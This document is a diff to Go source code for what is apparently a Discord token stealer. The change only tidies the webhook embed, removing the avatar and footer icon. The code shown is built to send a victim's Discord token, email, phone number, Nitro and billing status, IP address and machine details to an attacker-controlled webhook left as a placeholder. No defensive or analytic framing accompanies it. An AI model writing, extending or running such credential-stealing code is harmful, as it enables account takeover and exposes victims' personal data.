@@ -15,14 +15,13 @@ import (
 )
 
 const (
-	WebhookUrl       = "YOUR_WEBHOOK_URL"
-	WebhookAvatarUrl = "YOUR_WEBHOOK_IMG (ex: https://imgur.com/a/xxxxx)"
-	WebhookUsername  = "YOUR_WEBHOOK_NAME"
-	DiscordApiUsers  = "https://discord.com/api/v9/users/@me"
-	DiscordApiNitro  = "https://discord.com/api/v9/users/@me/billing/subscriptions"
-	DiscordImgUrl    = "https://cdn.discordapp.com/avatars/"
-	IpAddrGet        = "https://ipinfo.io/ip"
-	Debug            = false
+	WebhookUrl      = "YOUR_WEBHOOK_URL"
+	WebhookUsername = "YOUR_WEBHOOK_NAME"
+	DiscordApiUsers = "https://discord.com/api/v9/users/@me"
+	DiscordApiNitro = "https://discord.com/api/v9/users/@me/billing/subscriptions"
+	DiscordImgUrl   = "https://cdn.discordapp.com/avatars/"
+	IpAddrGet       = "https://ipinfo.io/ip"
+	Debug           = false
 )
 
 func doesItemExists(arr []string, item string) bool {
@@ -179,7 +178,7 @@ func grabTokenInformation(token string) (jsonEmbed string) {
 		fmt.Printf("Discord Nitro: %s\n", discordNitro)
 	}
 
-	jsonEmbed = "{\"avatar_url\":\"" + WebhookAvatarUrl + "\",\"embeds\":[{\"thumbnail\":{\"url\":\"" + discordAvatar + "\"},\"color\":3447003,\"footer\":{\"icon_url\":\"https://i.imgur.com/Q8uuwN4.png\",\"text\":\"" + time.Now().Format("2006.01.02 15:04:05") + "\"},\"author\":{\"name\":\"" + discordUser + "\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: " + discordEmail + "\\nPhone: " + discordPhone + "\\nNitro: " + discordNitro + "\\nBilling Info: " + discordNitro + "\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: " + ip + "\\nDisplayName: " + displayName + "\\nOS: " + osName + "\\nCPU Arch: " + cpuArch + "\"},{\"name\":\"**Token**\",\"value\":\"```" + token + "```\"}]}],\"username\":\"" + WebhookUsername + "\"}"
+	jsonEmbed = "{\"embeds\":[{\"thumbnail\":{\"url\":\"" + discordAvatar + "\"},\"color\":3447003,\"footer\":{\"text\":\"" + time.Now().Format("2006.01.02 15:04:05") + "\"},\"author\":{\"name\":\"" + discordUser + "\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: " + discordEmail + "\\nPhone: " + discordPhone + "\\nNitro: " + discordNitro + "\\nBilling Info: " + discordNitro + "\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: " + ip + "\\nDisplayName: " + displayName + "\\nOS: " + osName + "\\nCPU Arch: " + cpuArch + "\"},{\"name\":\"**Token**\",\"value\":\"```" + token + "```\"}]}],\"username\":\"" + WebhookUsername + "\"}"
 	return
 }
 
